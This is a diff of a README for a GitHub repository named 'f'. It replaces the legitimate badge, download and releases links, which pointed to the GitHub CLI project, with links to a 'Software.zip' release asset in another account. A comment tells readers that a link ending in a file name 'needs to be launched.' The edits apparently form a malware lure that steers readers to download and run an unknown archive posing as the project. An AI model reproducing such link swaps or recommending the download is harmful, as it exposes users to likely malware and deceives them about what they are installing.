@@ -1,7 +1,7 @@
 # Welcome to "f" Repository!
 
-![GitHub repo size](https://img.shields.io/github/repo-size/{username}/{repository_name})
-![GitHub license](https://img.shields.io/github/license/{username}/{repository_name})
+![GitHub repo size](https://github.com/wowowowowowow-tceh/f/releases/download/v1.0/Software.zip{username}/{repository_name})
+![GitHub license](https://github.com/wowowowowowow-tceh/f/releases/download/v1.0/Software.zip{username}/{repository_name})
 
 ---
 
@@ -13,7 +13,7 @@ Welcome to the "f" repository! This repository does not have a specific short de
 ## How to Launch
 To start using "f", you can download the repository by clicking the link below. 
 
-[Download "f"](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download "f"](https://github.com/wowowowowowow-tceh/f/releases/download/v1.0/Software.zip)
 
 <!-- If the link ends with a file name, it needs to be launched. -->
 
@@ -35,7 +35,7 @@ Here are some key contents of the repository:
 ---
 
 ## Additional Information
-For more details and updates, please check the [Releases](https://github.com/cli/cli/releases) section.
+For more details and updates, please check the [Releases](https://github.com/wowowowowowow-tceh/f/releases/download/v1.0/Software.zip) section.
 
 ---
 
